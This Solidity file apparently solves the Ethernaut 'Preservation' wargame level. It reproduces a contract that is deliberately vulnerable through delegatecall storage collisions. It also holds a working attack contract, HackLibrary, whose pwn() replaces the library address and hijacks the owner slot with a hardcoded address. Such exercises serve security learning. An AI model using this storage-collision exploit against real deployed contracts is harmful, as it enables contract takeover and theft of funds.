// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    function setFirstTime(uint256 _timeStamp) public {
        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }

    // set the time for timezone 2
    function setSecondTime(uint256 _timeStamp) public {
        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint256 storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}

interface IPreservation {
    function setFirstTime(uint256 _timeStamp) external ;
}


contract HackLibrary{


constructor (address _target) {
owner = msg.sender;
preservation = IPreservation(_target);
}


    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
     IPreservation public preservation;

        function setTime(uint256 _time) public {
        owner = 0xDC5a37C1147304a62d5adbB5664be00a9A0DEe6e;
    }
        function pwn() public {
preservation.setFirstTime(uint256(uint160(address(address(this)))));
}

}